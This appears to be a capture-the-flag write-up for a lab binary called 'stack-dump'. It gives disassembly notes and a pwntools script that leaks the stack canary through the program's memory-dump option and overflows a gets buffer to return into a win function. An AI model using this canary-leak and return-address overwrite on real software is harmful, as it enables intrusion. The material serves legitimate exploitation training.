## stack-dump
> exploit gets 
> bypass canary by using memory dump when got the canary addr
> by quit return to the win address
> trick: using gdb by type canary

* rbp -0x50 buffer

```
00401436  488d057c0c0000     lea     rax, [rel data_4020b9]
0040143d  4889c7             mov     rdi, rax  {data_4020b9, "len: "}
00401440  b800000000         mov     eax, 0x0
00401445  e846fdffff         call    printf
0040144a  488d45b0           lea     rax, [rbp-0x50 {buffer_overflow_input}]
0040144e  4889c7             mov     rdi, rax {buffer_overflow_input}
00401451  e86afdffff         call    gets
00401456  488d05e80b0000     lea     rax, [rel data_402045]
0040145d  4889c7             mov     rdi, rax  {data_402045}
00401460  b800000000         mov     eax, 0x0
```

* rbp - 0x18 canary check

```
00401552  488b45e8           mov     rax, qword [rbp-0x18 {canary}]
00401556  64482b0425280000…  sub     rax, qword [fs:0x28]
0040155f  7405               je      0x401566

```

* rsp addr already known, so canary addr = 0x59 - 0x18 = 65

```
004013b6  4883ec58           sub     rsp, 0x58
004013ba  64488b0425280000…  mov     rax, qword [fs:0x28]
004013c3  488945e8           mov     qword [rbp-0x18 {canary}], rax
004013c7  31c0               xor     eax, eax  {0x0}
004013c9  488d05780c0000     lea     rax, [rel data_402048]
004013d0  4889c7             mov     rdi, rax  {data_402048, "Lets try a real stack canary, li…"}
004013d3  e858fdffff         call    puts
004013d8  488d45a7           lea     rax, [rbp-0x59 {choice_var}]
004013dc  4889c6             mov     rsi, rax {choice_var}
004013df  488d059a0c0000     lea     rax, [rel data_402080]
004013e6  4889c7             mov     rdi, rax  {data_402080, "To make things easier, here's a …"}
```
* get canary addr's value by type d since we got canary addr 

```
004014ad  488d45b0           lea     rax, [rbp-0x50 {buffer_overflow_input}]
004014b1  488b00             mov     rax, qword [rax {buffer_overflow_input}]
004014b4  488945a8           mov     qword [rbp-0x58 {var_60_1}], rax
004014b8  488b45a8           mov     rax, qword [rbp-0x58 {var_60_1}]
004014bc  4889c6             mov     rsi, rax
004014bf  488d05fb0b0000     lea     rax, [rel data_4020c1]
004014c6  4889c7             mov     rdi, rax  {data_4020c1, "memory at %p: "}
004014c9  b800000000         mov     eax, 0x0
004014ce  e8bdfcffff         call    printf
```


* make payload following type i:
payload: 0x50-0x18 = 56 * A (56bytes) + canary (8bytes) + 16bytes + rbp(8bytes) + return win func

* to quit the loop by type q go return win addr

```
{Case 0xd, 0x2d}
00401551  90                 nop     
00401552  488b45e8           mov     rax, qword [rbp-0x18 {canary}]
00401556  64482b0425280000…  sub     rax, qword [fs:0x28]
0040155f  7405               je      0x401566

00401561  e8fafbffff         call    __stack_chk_fail
{ Does not return }

00401566  488b5df8           mov     rbx, qword [rbp-0x8 {__saved_rbx}]
0040156a  c9                 leave    {__saved_rbp}
0040156b  c3                 retn     {__return_addr}

```


```
from pwn import *

def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    prompt = p.recvuntil(b'[q]uit').decode('utf-8')
    address_match = re.search(r'0x[0-9a-fA-F]+', prompt)
    if address_match:
        address = int(address_match.group(0), 16)  # Convert address to integer
        print("address:", hex(address))

        canary_address = address + 65
        print("Modified address (address + 65):", hex(canary_address))

        little_endian_address = struct.pack("<Q", canary_address)  # Use "<Q" for little-endian 64-bit integer
        print("Little-endian format:", little_endian_address.hex())  # Print in hex format for clarity

        # Send the "i" command to the process
        p.sendline(b"i")
        p.recvuntil(b'len:')
        p.sendline(little_endian_address)

        p.sendline(b"\nd")
        p.recvuntil(b': ').decode('utf-8')
        stack_canary = p.recv(8)
        # stack_canary = stack_canary[::-1]
        print("canary:", stack_canary, len(stack_canary))
        #
        p.sendline(b"\n\ni")
        p.recvuntil(b'len:')
        address = 0x4012f6 # win addr
        win_addr = p64(address)
        payload = b"A" * 56 + stack_canary + b"A" * 24 + win_addr
        p.sendline(payload)
        print("payload: ", payload)

        p.recvline().decode('utf-8')
        p.recvline().decode('utf-8')
        p.sendline(b"\n\n\nq")


    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 7139)
# interact_with_process('../w2/stack-dump')
```
